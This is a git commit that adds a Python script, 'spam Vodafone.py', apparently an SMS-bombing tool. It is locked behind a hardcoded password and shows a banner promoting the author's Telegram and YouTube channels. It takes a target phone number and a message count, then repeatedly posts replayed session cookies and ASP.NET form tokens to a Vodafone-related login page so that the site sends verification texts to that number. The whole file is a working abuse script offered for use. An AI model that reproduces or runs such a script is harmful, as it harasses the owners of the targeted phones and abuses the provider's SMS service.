d1bde9830baffa2342e9acd85ad9e17e417a48d8
Abdullah Salah <95449686+AbdullahSalaah0099@users.noreply.github.com>
2022-04-03 02:23:13 +0200

    Add files via upload

---
+++ spam Vodafone.py
@@ -0,0 +1,144 @@
+import requests,sys,time
+import requests,random 
+import sys,time,pyfiglet ,os
+print ('\033[;093m')
+time.sleep (0)
+x=input ('\033[;093m》Enter Password  : \033[;096m')	
+if x == 'AbdullahSalah0099':
+    time.sleep (0.6)
+    print ()
+    print ('》True password')
+    print ('\033[;092m')
+
+else :
+    print ('\033[;091mError Password Try again')
+    exit()
+time.sleep (2)
+print ('\033[;093m='*50)
+print ('\033[;096m')
+poli=pyfiglet.figlet_format ('            SPAM\n   Vodafone\nBy  Abdullah')
+print (poli)
+c=('\033[;092m×××××××××××××××××××××××××××××××××××××××')
+for I in c+'\n':
+	sys.stdout.write (I)
+	sys.stdout.flush ()
+	time.sleep (00.050)
+print ()
+d =('\033[;092m##### Welcome To Abdullah Script #####')
+for I in d +'\n':
+	sys.stdout.write (I)
+	sys.stdout.flush ()
+	time.sleep (00.10)
+print ()
+c='#### Script Spam Sms for Vodafone ###'
+for I in c+'\n':
+    sys.stdout.write(I) 
+    sys.stdout.flush ()
+    time.sleep (00.10)
+print ()
+c='### Projected By Abdullah  Salah ###'
+for I in c+'\n':
+    sys.stdout.write(I) 
+    sys.stdout.flush ()
+    time.sleep (00.10)
+print ()
+
+
+i='''\033[;095m\033[;092m Telegram channel : 
+
+  ◇ http://t.me/Techno0099
+          
+Youttube channel  : 
+
+ ◇ https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg '''
+for I in i +'\n':
+	sys.stdout.write (I)
+	sys.stdout.flush ()
+	time.sleep (00.040)
+print ()
+
+number=input ('》Enter Phone Number  :  \033[;096m')
+if len(number) !=11:
+    print ('\033[;091mError Number')
+elif number==str:
+        print ('\033[;091mError Number')
+    
+else :
+    print ()
+    number_of_messeges=(int(input ('\033[;092m》Enter Number Of Messages  :  \033[;096m')))
+#else:
+#    print ('\033[;091mError Password')
+    number_of_messegesx=0
+    while number_of_messegesx<number_of_messeges: 
+
+        url='http://90minvf.com/login'
+
+        headers ={
+'Host': '90minvf.com',
+
+'Connection': 'keep-alive',
+
+'Content-Length': '1295',
+
+'Cache-Control': 'no-cache',
+
+'DNT': '1',
+
+'X-Requested-With': 'XMLHttpRequest',
+
+'X-MicrosoftAjax': 'Delta=true',
+
+'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
+
+'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+
+'Accept': '*/*',
+
+'Origin': 'http://90minvf.com',
+
+'Referer': 'http://90minvf.com/login',
+
+'Accept-Encoding': 'gzip, deflate',
+
+'Accept-Language': 'ar-EG,ar-AE;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+
+'Cookie': 'ASP.NET_SessionId=emsjzmhorowsq5y4bbfa214z; _fbp=fb.1.1648389299840.1434596381; _ga=GA1.2.73257886.1648389321; _gid=GA1.2.1531723474.1648389321'
+}
+
+        data={
+'ctl31':'uplauth|btnSubmit',
+
+'__LASTFOCUS':'',
+
+'__EVENTTARGET':'',
+
+'__EVENTARGUMENT':'',
+
+'__VIEWSTATE':'frk8gFZmGD+U+QKnZ765QELcbVHIQKUoKxFHYxFiVCtlZ8L4sh8d7LPXsIaGWqgbuPMvv/dmI+OD2xBK1cPhas4VClyda7v/TLQSuO+bYMK42ZUA9XFLG1MxLVPa1DajIxRPBp4lj+j408FsE9d/wITMee3ElGZ/G+P/YXKgZzJiF5tqvyAkBltAdjh8++iIA9j4fDfC7r0yGkaAQxHfjPVEUvD1XIFoHHWtjwgUbJRX464GNqhcBQ6HQ83xYUL7NnVQQE9pPR6PDcnVOkmkF/9JTLSPmoJI4viziCSnitoLeztT9AqeHhcI6WDcc54eN4fEKkQF7gsUMJmrY1ftc5ulDbZiISmveUlHeuJiJO8ezeZ/fxm59LYXwfICo8AEyn0C6o93UvI/Ptg6pSejCBTn+raovNSj4pw3uOxj5H7uW7YWe0U4UUIDtLQ0bjPd9mGIj7eadkSqyrIJA5m8VxrY+8KNWm2sCbW6J+1J8HJL+pWRybIfgfFWKcY2f2JAtdh8XtRFyBnPcECvGFe5IQqNNFYNLmPxghodNHCl9FzRO6SivjszW6q151jCFk47lnqOFcvVzByOiD+g6lZ5LiNjlPPFUau+afd+SfMxiLM2cJM01tI1fUumlX+cpj+WH3KRvmNPsGsk2BSYOcNMGlTOXkNR3/l0RWoYsC5p/zBVi1u97ASazqxrTG+zoMh8QNVu/FANRwwbgXDmg7Nch+5A5WrAC6v0YXHCBHCI8T15DttzPhBBkeFxhGDXs5qtQTPedu05GANFklF4xhiSm2lAlPafhypoA4kISwvRTnSpQpK6kNeCI/zieB/mUJMEszvy7nmMxAXMecz8lbcZcg==',
+
+'__VIEWSTATEGENERATOR':'C2EE9ABB',
+
+'__EVENTVALIDATION':'6CZsoZRy+gMNHPWYLyJWFoYwkTrcPOk28inhROMO4i1D4FBHYPyaxTzxEfnEkplVUayRmZeY/fqbMjn9a3HQi8ByQFXDVBA504J9IQ9ROSdq4xXeC8uF3yWPGicOvM7QNwHW1fSCwqlyIUwOuInYGA==',
+
+'txtPhone':number,
+
+'__ASYNCPOST':'true',
+
+'btnSubmit':'إرسال'
+
+
+}
+        r=requests.post (url, headers=headers, data=data).text
+        print ()
+        if True :
+            time.sleep (1)
+            number_of_messegesx=number_of_messegesx+1
+            print (f'\033[;096mDone Send {number_of_messegesx} SMS')
+        elif '1|#||4|9|pageRedirect||%2fverify|' in r:
+            time.sleep (1)
+            number_of_messegesx=number_of_messegesx+1
+            print (f'\033[;096mDone Send {number_of_messegesx} SMS')
+
+        else:
+            print ('\033[;091mSomthing wrong')
+            print ('\033[;092m')
